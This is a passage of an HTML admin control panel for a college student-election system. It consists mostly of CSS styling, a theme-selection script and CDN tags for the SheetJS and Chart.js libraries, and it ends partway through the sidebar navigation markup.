.results-visibility-row{display:flex;flex-wrap:wrap;gap:.5rem;align-items:center;margin-bottom:.75rem;}
.results-visibility-row .vis-label{font-size:.78rem;color:var(--muted);font-weight:600;margin-right:.3rem;}
.result-row{margin-bottom:.9rem;}
.result-header{display:flex;justify-content:space-between;font-size:.88rem;}
.results-block{margin-bottom:1.75rem;}

/* ================= LOGS PANEL ================= */
.logs-full{background:var(--surface);border-radius:var(--radius-md);box-shadow:var(--card-shadow);border:1px solid var(--line);overflow:hidden;}
.logs-full .log-item{padding:.85rem 1.5rem;}
.logs-filter{display:flex;gap:.5rem;margin-bottom:1rem;flex-wrap:wrap;}
.log-day-header{padding:.7rem 1.5rem;font-size:.72rem;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:var(--muted);background:var(--surface-2);border-bottom:1px solid var(--line);}
/* Batch A3: throttle card in the Logs view */
.throttle-card{margin:0 0 1rem;padding:1rem 1.25rem;border:1px solid var(--line);border-radius:12px;background:var(--surface-2)}
.throttle-head h3{margin:0 0 .15rem;font-size:.95rem}
.throttle-head p{margin:0 0 .75rem;font-size:.78rem;color:var(--muted)}
.throttle-row{display:flex;align-items:center;gap:.75rem;padding:.5rem 0;border-top:1px solid var(--line)}
.throttle-row:first-of-type{border-top:none}
.throttle-info{display:flex;flex-direction:column;gap:.1rem;min-width:0;flex:1}
.throttle-info strong{font-size:.82rem}
.throttle-id{font-family:var(--font-mono);font-size:.72rem;color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.throttle-count{font-size:.75rem;color:var(--muted);white-space:nowrap}
/* Batch A4: maintenance card in Settings */
.maintenance-row{display:flex;align-items:center;gap:.75rem;padding:.6rem 0;border-top:1px solid var(--line)}
.maintenance-row:first-of-type{border-top:none}
.mt-info{display:flex;flex-direction:column;gap:.1rem;flex:1;min-width:0}
.mt-info strong{font-size:.82rem}
.mt-count{font-size:.72rem;color:var(--muted);font-family:var(--font-mono)}
/* Batch B1: admin accounts card */
.adminacct-row{display:flex;align-items:center;gap:.75rem;padding:.6rem 0;border-top:1px solid var(--line)}
.adminacct-row:first-of-type{border-top:none}
.adminacct-info{display:flex;flex-direction:column;gap:.1rem;flex:1;min-width:0}
.adminacct-info strong{font-size:.85rem}
.you-badge{font-size:.65rem;background:var(--lime);color:#1a2e05;padding:.1rem .45rem;border-radius:99px;margin-left:.4rem;vertical-align:middle;font-weight:700;letter-spacing:.04em}
.adminacct-meta{font-size:.72rem;color:var(--muted);font-family:var(--font-mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.adminacct-add{flex-wrap:wrap}
.log-item{position:relative;}
.log-item .log-dot{width:7px;height:7px;border-radius:50%;background:var(--lime);flex-shrink:0;margin-top:.4rem;}

.coming-soon{background:var(--surface);border-radius:var(--radius-md);border:1px solid var(--line);padding:3rem 2rem;text-align:center;color:var(--muted);box-shadow:var(--card-shadow);}
.coming-soon .cs-icon{font-size:2.5rem;margin-bottom:.75rem;}

/* ================= STUDENTS PANEL ================= */
.students-toolbar{display:flex;flex-wrap:wrap;gap:.6rem;align-items:center;margin-bottom:1.25rem;}
.students-toolbar input[type=text]{flex:1;min-width:180px;padding:.55rem .8rem;border:1px solid var(--line-strong);border-radius:9px;font-size:.85rem;background:var(--input-bg);color:var(--ink);}
.students-toolbar select{padding:.55rem .7rem;border:1px solid var(--line-strong);border-radius:9px;font-size:.83rem;background:var(--input-bg);color:var(--ink);}
.students-table-wrap{background:var(--surface);border-radius:var(--radius-md);box-shadow:var(--card-shadow);border:1px solid var(--line);overflow-x:auto;}
.name-cell-flex{display:flex;align-items:center;gap:.65rem;}
table.students-table{width:100%;border-collapse:collapse;font-size:.85rem;table-layout:fixed;}
table.students-table th{text-align:left;color:var(--muted);font-size:.7rem;text-transform:uppercase;letter-spacing:.03em;padding:.55rem .6rem;border-bottom:2px solid var(--line);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
table.students-table td{padding:.55rem .6rem;border-bottom:1px solid var(--border-soft);vertical-align:middle;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
table.students-table tr:last-child td{border-bottom:none;}
table.students-table tr:hover td{background:var(--surface-hover);}
.name-cell{white-space:normal !important;min-width:0;}
.name-cell-text{min-width:0;flex:1;}
.name-cell .nm{display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.name-cell .sub{font-size:.72rem;color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
/* Compact pills so status text fits the fixed columns without scrolling */
.students-table .status-pill{padding:.2rem .45rem;font-size:.68rem;gap:.25rem;}
.status-pill{display:inline-flex;align-items:center;gap:.35rem;font-size:.72rem;font-weight:700;padding:.28rem .65rem;border-radius:999px;white-space:nowrap;}
.status-pill.voted{color:#15803d;background:rgba(34,197,94,.12);}
.status-pill.not-voted{color:#b45309;background:rgba(245,158,11,.12);}
.status-pill.active{color:#1e40af;background:rgba(59,130,246,.12);}
.status-pill.suspended{color:#b91c1c;background:rgba(239,68,68,.1);}
.status-pill.unregistered{color:#6b7280;background:rgba(107,114,128,.12);}
.status-pill.normal{color:#475569;background:rgba(100,116,139,.14);}
.row-actions{display:flex;gap:.4rem;justify-content:flex-end;}
.row-actions button{border:none;background:var(--surface-2);color:var(--ink);width:30px;height:30px;border-radius:8px;cursor:pointer;font-size:.85rem;display:inline-flex;align-items:center;justify-content:center;}
.row-actions button:hover{background:var(--surface-hover);}
.row-actions button.danger{color:#dc2626;}
.row-actions button.danger:hover{background:#fee2e2;}
.empty-row td{text-align:center;color:var(--muted);padding:2rem 1rem;}

.pw-field{position:relative;display:flex;align-items:stretch;}
.pw-field input{flex:1;padding-right:2.5rem;}
.pw-toggle-btn{position:absolute;right:.4rem;top:50%;transform:translateY(-50%);background:none;border:none;padding:.25rem;cursor:pointer;display:flex;align-items:center;justify-content:center;line-height:0;}
.pw-toggle-btn svg{width:18px;height:18px;stroke:#64748b;}
.pw-toggle-btn .pw-icon-off{display:block;}
.pw-toggle-btn .pw-icon-on{display:none;}
.pw-toggle-btn.is-visible .pw-icon-off{display:none;}
.pw-toggle-btn.is-visible .pw-icon-on{display:block;}
.pw-hint{font-size:.75rem;color:var(--muted);margin-top:.3rem;}

/* Visible focus rings — helps anyone navigating by keyboard or with
   assistive tech on mobile, without adding an outline to every mouse click. */
.btn:focus-visible,.pill-toggle button:focus-visible,.view-switch button:focus-visible,.sidebar nav a:focus-visible,
.row-actions button:focus-visible,.type-choice:focus-visible{
    outline:2px solid var(--lime-dark);outline-offset:2px;
}

/* Kill native browser reveal-password icons */
input[type="password"]::-ms-reveal,
input[type="password"]::-ms-clear { display: none; width: 0; height: 0; }
input[type="password"]::-webkit-credentials-auto-fill-button,
input[type="password"]::-webkit-strong-password-auto-fill-button {
    visibility: hidden; display: none !important; pointer-events: none;
    position: absolute; right: 0;
}

/* Chrome/Edge forcibly paint autofilled and "saved info" fields (like the
   Student ID field's saved-values dropdown) with their own white
   background and black text — normal background/color rules can't
   override this. The only reliable fix is this inset box-shadow trick,
   which paints over it with our own themed color, plus a very long
   transition delay to suppress the yellow flash Chrome briefly shows
   before that repaint happens. Applies in both themes since --input-bg
   and --ink already resolve to the right colors for whichever is active. */
input:-webkit-autofill,
input:-webkit-autofill:hover,
input:-webkit-autofill:focus,
input:-webkit-autofill:active {
    -webkit-box-shadow: 0 0 0 1000px var(--input-bg) inset !important;
    -webkit-text-fill-color: var(--ink) !important;
    caret-color: var(--ink);
    transition: background-color 5000s ease-in-out 0s;
}

/* ================= RESPONSIVE ================= */
/* Prevent any stray wide element from causing horizontal scroll of the
   whole page on phones — individual tables/wizards handle their own
   scrolling instead (see .students-table-wrap / .table-scroll below). */
html,body{overflow-x:hidden;}

@media (max-width:768px){
    .sidebar{transform:translateX(-100%);width:82vw;max-width:300px;box-shadow:0 0 40px rgba(0,0,0,.25);}
    .sidebar.open{transform:translateX(0);}
    .sidebar nav a,.sidebar .logout-link a{padding:.9rem 1.5rem;font-size:1rem;} /* bigger tap targets */
    .sidebar .logout-link{padding-bottom:env(safe-area-inset-bottom,0);}

    .main-content{margin-left:0;padding:1rem 1rem 2.5rem;}
    .page-header{
        flex-direction:row;align-items:center;background:var(--surface);box-shadow:0 2px 4px rgba(0,0,0,.05);
        padding:.6rem .85rem;margin-bottom:1.25rem;border-bottom:none;border-radius:0 0 14px 14px;
        margin-left:-1rem;margin-right:-1rem;width:calc(100% + 2rem);
    }
    .page-header h1{font-size:1.1rem;}
    .page-header .date{font-size:.75rem;}
    .hamburger{display:block;min-width:44px;min-height:44px;}

    /* Tap targets: keep every clickable control comfortably thumb-sized */
    .btn{min-height:44px;}
    .btn-sm{min-height:38px;}
    .row-actions button{width:38px;height:38px;font-size:.95rem;}
    .pill-toggle button{padding:.55rem 1rem;}

    /* Form inputs at 16px prevent iOS Safari auto-zoom-on-focus */
    .form-row input[type=text], .form-row input[type=number], .form-row input[type=password],
    .form-row select, .form-row textarea,
    .schedule-field input, .students-toolbar input[type=text], .students-toolbar select,
    table.pos-table input, table.pos-table select{
        font-size:16px;
    }

    /* Stat cards: 2-up on phones instead of squeezing 4 into one row */
    .stats-bar{grid-template-columns:1fr 1fr;gap:.75rem;margin-bottom:1.5rem;}
    .stat-box{padding:.85rem 1rem;border-radius:14px;}
    .stat-box .stat-number{font-size:1.6rem;}
    .stat-box .stat-label{font-size:.78rem;}

    .card{padding:1.1rem;border-radius:14px;}
    .section-title{font-size:1.15rem;}

    /* Election cards */
    .election-card{padding:1.1rem 1.15rem;border-radius:14px;gap:.85rem;}
    .election-title{font-size:1.15rem;}
    .card-top-row{gap:.5rem;}
    .card-actions{flex-direction:column;align-items:stretch;}
    .action-group-primary,.action-group-secondary{flex-direction:column;width:100%;margin-left:0;}
    .card-actions .btn{width:100%;font-size:.8rem;padding:0 .5rem;}

    /* Schedule box: stack fields full-width, save button full-width */
    .schedule-box{flex-direction:column;align-items:stretch;gap:.75rem;padding:.9rem;}
    .schedule-field{width:100%;}
    .schedule-field input{width:100%;}
    .schedule-box .btn{width:100%;}

    /* Wizard */
    .wizard-topbar{gap:.6rem;margin-bottom:1rem;flex-wrap:wrap;}
    .wizard-section{padding:1.1rem;border-radius:14px;}
    .type-choice{padding:1.1rem;}
    .candidate-photo-row{flex-wrap:wrap;}

    /* Position table becomes horizontally scrollable on its own rather
       than squeezing 5 columns into a phone width. */
    #positionsTable{display:block;overflow-x:auto;-webkit-overflow-scrolling:touch;white-space:nowrap;}
    #positionsTable td, #positionsTable th{white-space:nowrap;}

    /* Wizard footer: stick to the bottom of the screen so Save/Next is
       always reachable without hunting for it after scrolling a long form. */
    .wizard-footer{
        position:sticky;bottom:0;left:0;margin:1.5rem -1rem -2.5rem;padding:.85rem 1rem calc(.85rem + env(safe-area-inset-bottom,0));
        background:rgba(244,247,250,.92);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);
        border-top:1px solid var(--line);flex-direction:column-reverse;gap:.6rem;
    }
    .wizard-footer .btn{width:100%;}

    /* Students toolbar: search full-width on its own row, filters wrap below */
    .students-toolbar{gap:.5rem;}
    .students-toolbar input[type=text]{flex:1 1 100%;min-width:0;}
    .students-toolbar select{flex:1 1 calc(50% - .25rem);}

    /* Give the students table a visible "scroll for more" cue on phones */
    .students-table-wrap{position:relative;border-radius:14px;}
    .students-table-wrap::after{
        content:'';position:absolute;top:0;right:0;bottom:0;width:24px;pointer-events:none;
        background:linear-gradient(to right, rgba(255,255,255,0), rgba(15,23,42,.06));
    }
    table.students-table{font-size:.8rem;}
    table.students-table th, table.students-table td{padding:.6rem .7rem;}

    .donut-wrap{gap:1rem;justify-content:space-around;}
    .grid-2{gap:1rem;}
}

@media (max-width:420px){
    .stats-bar{grid-template-columns:1fr 1fr;gap:.6rem;}
    .election-card .card-actions .btn{font-size:.85rem;}
    .page-header .date{display:none;} /* redundant with the day already implied; frees space for the title */
}

/* ================= TOASTS ================= */
.toast-stack{position:fixed;top:1.25rem;right:1.25rem;z-index:4000;display:flex;flex-direction:column;gap:.6rem;max-width:360px;}
@media (max-width:768px){.toast-stack{left:1rem;right:1rem;max-width:none;top:calc(1rem + env(safe-area-inset-top,0));}}
.toast{
    background:var(--surface);border-radius:12px;box-shadow:0 8px 28px -8px rgba(15,23,42,.35);border:1px solid var(--line);
    padding:.85rem 1rem;display:flex;align-items:flex-start;gap:.65rem;font-size:.85rem;color:var(--ink);
    animation:toastIn .25s ease;
}
.toast.leaving{animation:toastOut .2s ease forwards;}
@keyframes toastIn{from{opacity:0;transform:translateY(-8px) scale(.98);}to{opacity:1;transform:none;}}
@keyframes toastOut{to{opacity:0;transform:translateX(12px);}}
.toast .toast-icon{width:20px;height:20px;flex-shrink:0;border-radius:50%;display:flex;align-items:center;justify-content:center;}
.toast .toast-icon svg{width:12px;height:12px;}
.toast.success .toast-icon{background:#dcfce7;color:#15803d;}
.toast.error .toast-icon{background:#fee2e2;color:#dc2626;}
.toast.info .toast-icon{background:#dbeafe;color:#2563eb;}
.toast.warning .toast-icon{background:#fef3c7;color:#b45309;}
.toast .toast-msg{flex:1;line-height:1.4;}
.toast .toast-close{background:none;border:none;color:var(--muted);cursor:pointer;font-size:1rem;line-height:1;padding:.1rem;flex-shrink:0;}
.toast .toast-action{background:none;border:none;color:var(--lime-dark);font-weight:700;cursor:pointer;font-size:.8rem;padding:0;margin-top:.25rem;}

/* ================= MODAL ================= */
.modal-overlay{position:fixed;inset:0;background:rgba(15,23,42,.5);z-index:3900;display:flex;align-items:center;justify-content:center;padding:1.25rem;animation:modalFade .15s ease;}
@keyframes modalFade{from{opacity:0;}to{opacity:1;}}
.modal-box{background:var(--surface);border-radius:var(--radius-md);box-shadow:0 24px 60px -20px rgba(15,23,42,.5);max-width:420px;width:100%;padding:1.5rem;animation:modalPop .18s ease;}
@keyframes modalPop{from{opacity:0;transform:scale(.96) translateY(6px);}to{opacity:1;transform:none;}}
.modal-box .modal-icon{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;margin-bottom:.9rem;}
.modal-box .modal-icon.danger{background:#fee2e2;color:#dc2626;}
.modal-box .modal-icon.neutral{background:#eff6ff;color:#2563eb;}
.modal-box .modal-icon svg{width:22px;height:22px;}
.modal-box h3{margin:0 0 .5rem;font-size:1.05rem;color:var(--ink);}
.modal-box p{margin:0;color:var(--muted);font-size:.88rem;line-height:1.5;}
.modal-box .modal-actions{display:flex;justify-content:flex-end;gap:.6rem;margin-top:1.5rem;}
@media (max-width:480px){.modal-box .modal-actions{flex-direction:column-reverse;}.modal-box .modal-actions .btn{width:100%;}}

/* ================= SKELETON LOADERS ================= */
.skeleton{background:linear-gradient(90deg,#eef1f6 25%,#e4e8ef 37%,#eef1f6 63%);background-size:400% 100%;animation:skeletonShine 1.4s ease infinite;border-radius:8px;}
@keyframes skeletonShine{0%{background-position:100% 0;}100%{background-position:-100% 0;}}
.skel-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:1rem;margin-bottom:2rem;}
.skel-stat-box{height:92px;border-radius:var(--radius-md);}
.skel-card{height:180px;border-radius:var(--radius-md);margin-bottom:1.25rem;}
.skel-line{height:14px;margin-bottom:.6rem;}
.skel-line.w60{width:60%;}
.skel-line.w40{width:40%;}

/* ================= INLINE VALIDATION ================= */
.field-invalid{border-color:#dc2626 !important;background:#fef2f2;}
.field-error-msg{color:#dc2626;font-size:.75rem;margin-top:.3rem;}

/* ================= PAGINATION ================= */
.pagination-bar{display:flex;align-items:center;justify-content:space-between;gap:1rem;padding:.9rem 1rem;flex-wrap:wrap;border-top:1px solid var(--line);}
.pagination-bar .page-info{font-size:.8rem;color:var(--muted);}
.pagination-bar .page-controls{display:flex;gap:.4rem;align-items:center;}
.pagination-bar .page-controls button{border:1.5px solid var(--line-strong);background:var(--surface);color:var(--ink);width:32px;height:32px;border-radius:8px;cursor:pointer;font-size:.85rem;}
.pagination-bar .page-controls button:disabled{opacity:.4;cursor:not-allowed;}
.pagination-bar .page-controls button:not(:disabled):hover{background:var(--surface-hover);}
.pagination-bar .page-controls .page-btn.current{background:var(--navy);border-color:var(--navy);color:#fff;font-weight:700;}
.pagination-bar .page-controls .page-btn.current:hover{background:var(--navy);}
.pagination-bar .page-controls .page-gap{color:var(--muted);padding:0 .1rem;font-size:.85rem;align-self:center;}

/* ================= GETTING STARTED ================= */
.getting-started{background:linear-gradient(135deg,var(--navy) 0%,#1c2a3f 100%);border-radius:var(--radius-lg);padding:2rem 2.25rem;color:#fff;margin-bottom:2rem;}
.getting-started h2{margin:0 0 .35rem;font-size:1.3rem;}
.getting-started p{margin:0 0 1.5rem;color:#94a3b8;font-size:.9rem;max-width:520px;}
.gs-steps{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1rem;}
.gs-step{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);border-radius:12px;padding:1.1rem;}
.gs-step .gs-num{width:26px;height:26px;border-radius:8px;background:var(--lime);color:#052e16;font-weight:800;font-size:.8rem;display:flex;align-items:center;justify-content:center;margin-bottom:.6rem;}
.gs-step h4{margin:0 0 .3rem;font-size:.92rem;}
.gs-step p{margin:0 0 .8rem;font-size:.8rem;color:#94a3b8;}

/* ================= TREND SPARKLINE ================= */
.trend-note{font-size:.72rem;color:var(--muted);text-align:center;margin-top:.5rem;}
.trend-note strong{color:var(--ink);}

/* ================= SETTINGS PANEL ================= */
.settings-row{display:flex;align-items:center;gap:.5rem;padding:.6rem 0;border-bottom:1px solid var(--border-soft);flex-wrap:wrap;}
.settings-row:last-child{border-bottom:none;}
.settings-row input[type=text]{padding:.5rem .65rem;border:1px solid var(--line);border-radius:8px;font-size:.85rem;background:var(--input-bg);color:var(--ink);}
.settings-row .code-field{width:120px;flex-shrink:0;}
.settings-row .name-field{flex:1;min-width:140px;}
.settings-row .reorder-btns{display:flex;gap:.2rem;flex-shrink:0;}
.settings-row .reorder-btns .btn{padding:0 .6rem;}
.settings-add-row{display:flex;gap:.5rem;margin-top:.9rem;flex-wrap:wrap;align-items:center;}
.settings-add-row input[type=text], .settings-add-row input[type=email], .settings-add-row input[type=password]{flex:1;min-width:110px;padding:.55rem .7rem;border:1px solid var(--line-strong);border-radius:8px;font-size:.85rem;background:var(--input-bg);color:var(--ink);}
.settings-empty{color:var(--muted);font-size:.85rem;padding:.5rem 0;}

/* ================= IDLE / SESSION BANNER ================= */
.idle-banner{
    position:fixed;left:50%;bottom:1.25rem;transform:translateX(-50%);z-index:3800;
    background:var(--navy);color:#fff;border-radius:12px;padding:.85rem 1.1rem;display:flex;align-items:center;gap:.9rem;
    box-shadow:0 12px 30px -10px rgba(0,0,0,.5);font-size:.85rem;max-width:calc(100vw - 2rem);
}
.idle-banner button{flex-shrink:0;}

/* ================= THEME SWITCHER ================= */
.theme-switcher{padding:.6rem .75rem;display:flex;align-items:center;justify-content:space-between;gap:.5rem;}
.theme-switcher .ts-label{display:flex;align-items:center;gap:.6rem;color:#94a3b8;font-size:.82rem;font-weight:500;}
.theme-switcher .ts-label .nav-icon{width:17px;height:17px;}
.theme-toggle{
    position:relative;width:44px;height:24px;border-radius:999px;border:none;background:rgba(255,255,255,.12);
    cursor:pointer;flex-shrink:0;padding:0;transition:background .2s;
}
.theme-toggle::after{
    content:'';position:absolute;top:3px;left:3px;width:18px;height:18px;border-radius:50%;
    background:var(--lime);transition:transform .2s;
}
[data-theme="dark"] .theme-toggle::after{transform:translateX(20px);}
.theme-toggle:focus-visible{outline:2px solid var(--lime-dark);outline-offset:2px;}

/* ================= DARK-MODE COLOR OVERRIDES ================= */
/* Structural surfaces (cards, inputs, borders) already inherit dark
   values automatically because they reference the --surface/--ink/--muted/
   --line tokens redefined above. The pastel status/alert/badge colors
   below don't use those tokens — they hardcode a light tint + a dark
   saturated text color for contrast on a WHITE card, so each needs an
   explicit dark-mode pairing (higher-opacity tint + a lighter text tone)
   to stay readable on a dark card instead of just going muddy. */
[data-theme="dark"] .alert-success{background:rgba(34,197,94,.14);color:#4ade80;border-color:rgba(34,197,94,.3);}
[data-theme="dark"] .alert-error{background:rgba(239,68,68,.14);color:#f87171;border-color:rgba(239,68,68,.3);}
[data-theme="dark"] .alert-info{background:rgba(59,130,246,.14);color:#60a5fa;border-color:rgba(59,130,246,.3);}
[data-theme="dark"] .alert-warning{background:rgba(245,158,11,.14);color:#fbbf24;border-color:rgba(245,158,11,.3);}

[data-theme="dark"] .status-large{color:#4ade80;background:rgba(34,197,94,.16);}
[data-theme="dark"] .status-large.closed{color:#f87171;background:rgba(239,68,68,.16);}
[data-theme="dark"] .status-large.paused{color:#fbbf24;background:rgba(245,158,11,.18);}
[data-theme="dark"] .status-large.scheduled{color:#a5b4fc;background:rgba(99,102,241,.18);}
[data-theme="dark"] .status-large.draft{color:#cbd5e1;background:rgba(148,163,184,.18);}

[data-theme="dark"] .status-pill.voted{color:#4ade80;background:rgba(34,197,94,.16);}
[data-theme="dark"] .status-pill.not-voted{color:#fbbf24;background:rgba(245,158,11,.16);}
[data-theme="dark"] .status-pill.active{color:#60a5fa;background:rgba(59,130,246,.16);}
[data-theme="dark"] .status-pill.suspended{color:#f87171;background:rgba(239,68,68,.16);}
[data-theme="dark"] .status-pill.unregistered{color:#94a3b8;background:rgba(148,163,184,.16);}
[data-theme="dark"] .status-pill.normal{color:#cbd5e1;background:rgba(148,163,184,.18);}

[data-theme="dark"] .toast{color:var(--ink);}
[data-theme="dark"] .toast.success .toast-icon{background:rgba(34,197,94,.18);color:#4ade80;}
[data-theme="dark"] .toast.error .toast-icon{background:rgba(239,68,68,.18);color:#f87171;}
[data-theme="dark"] .toast.info .toast-icon{background:rgba(59,130,246,.18);color:#60a5fa;}
[data-theme="dark"] .toast.warning .toast-icon{background:rgba(245,158,11,.18);color:#fbbf24;}

[data-theme="dark"] .modal-box .modal-icon.danger{background:rgba(239,68,68,.16);color:#f87171;}
[data-theme="dark"] .modal-box .modal-icon.neutral{background:rgba(59,130,246,.16);color:#60a5fa;}

[data-theme="dark"] .skeleton{background:linear-gradient(90deg,#182238 25%,#212e48 37%,#182238 63%);background-size:400% 100%;}

/* MUST stay opaque: this class lands on <select> too, and Chrome
   propagates the select's color (near-white --ink) to the native dropdown
   popup while a translucent background can't be composited there — the
   popup falls back to a near-white surface → invisible white-on-white
   options. #211b28 is the old rgba(239,68,68,.08) wash pre-composited over
   --input-bg (#0f1726), so the tint looks identical but survives the
   popup. Alpha < 1 here re-breaks the Faculty dropdown. */
[data-theme="dark"] .field-invalid{border-color:#f87171 !important;background:#211b28;}
[data-theme="dark"] .field-error-msg{color:#f87171;}

[data-theme="dark"] .type-choice.selected{background:rgba(132,204,22,.1);}
/* OFF-state toggle track was hardcoded light gray (#cbd5e1) — a bright
   pill on the dark card. Dark slate keeps the white thumb readable. */
[data-theme="dark"] .toggle-switch .track{background:#475569;}
[data-theme="dark"] .btn-danger{color:#f87171;}

[data-theme="dark"] .candidate-photo-row img{border-color:var(--surface);background:var(--surface-2);}
[data-theme="dark"] .progress-bar-track{background:var(--surface-2);}

/* Smooth, non-jarring crossfade instead of an instant color snap when
   the toggle is flipped. */
body,.sidebar,.card,.stat-box,.election-card,.wizard-section,.students-table-wrap,
.logs-full,.coming-soon,.modal-box,.toast,input,select,textarea{
    transition:background-color .18s ease, color .18s ease, border-color .18s ease;
}
</style>
<script>
// Applied synchronously, before the body renders, so the page never
// flashes light-then-dark (or vice versa) on load. The transitions
// defined above are also skipped for this very first paint (see
// "no-transition" class removed a tick after DOMContentLoaded) so the
// initial theme just appears correctly rather than visibly animating in.
(function(){
    // Default is always light unless the admin has explicitly flipped the
    // switch before (saved in localStorage) — deliberately ignoring the
    // OS/browser's prefers-color-scheme, so the panel doesn't silently
    // open in dark mode just because the admin's system happens to be
    // in dark mode. The switch is "on" for dark, "off" (default) for light.
    var saved = localStorage.getItem('adminTheme');
    var theme = saved === 'dark' ? 'dark' : 'light';
    document.documentElement.setAttribute('data-theme', theme);
})();
</script>
<!-- Early preconnect so the deferred CDN fetches start their TLS handshake
     while the page shell is still downloading. -->
<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js" integrity="sha384-vtjasyidUo0kW94K5MXDXntzOJpQgBKXmE7e2Ga4LG0skTTLeBi97eFAXsqewJjw" crossorigin="anonymous" defer></script>
<!-- Chart.js drives the Results > Overview charts. Loaded from CDN for the
     same reason SheetJS is: no build step in this project. Every chart is
     guarded by a `chartLibReady()` check, so if the CDN is unreachable the
     Overview falls back to a plain message and the rest of the panel (and
     the whole admin dashboard) keeps working. -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js" integrity="sha384-bs/nf9FbdNouRbMiFcrcZfLXYPKiPaGVGplVbv7dLGECccEXDW+S3zjqSKR5ZEaD" crossorigin="anonymous" defer></script>
</head>
<body>

<!-- ================= APP SHELL ================= -->
<div id="appShell">
    <div class="sidebar-overlay" id="sidebarOverlay"></div>

    <div class="sidebar" id="sidebar">
        <div class="logo-area">
            <div class="badge"><img src="../assets/logo.png" alt="Aklan Catholic College logo"></div>
            <h2>Election Admin</h2>
            <div class="tag">Control Panel</div>
        </div>
        <nav>
            <a data-panel="dashboard" class="nav-link active" onclick="showPanel('dashboard')"><span class="nav-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/></svg></span> Dashboard</a>
            <a data-panel="election" class="nav-link" onclick="showPanel('election')"><span class="nav-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2.5"/><path d="M7.5 12l3 3 6-6.5"/></svg></span> Election</a>
            <a data-panel="students" class="nav-link" onclick="showPanel('students')"><span class="nav-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></span> Students</a>
            <a data-panel="results" class="nav-link" onclick="showPanel('results')"><span class="nav-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></svg></span> Results</a>
            <a data-panel="archive" class="nav-link" onclick="showPanel('archive')"><span class="nav-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5" rx="1"/><line x1="10" y1="12" x2="14" y2="12"/></svg></span> Archive</a>
            <a data-panel="logs" class="nav-link" onclick="showPanel('logs')"><span class="nav-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15.5 14"/></svg></span> Logs</a>
            <a data-panel="settings" class="nav-link" onclick="showPanel('settings')"><span class="nav-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg></span> Settings</a>
        </nav>
        <div class="theme-switcher">
            <span class="ts-label" id="themeLabel"><span class="nav-icon" id="themeIcon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg></span> Light Mode</span>
            <button type="button" class="theme-toggle" id="themeToggleBtn" role="switch" aria-checked="false" aria-label="Toggle dark mode"></button>
        </div>
        <div class="profile-section">
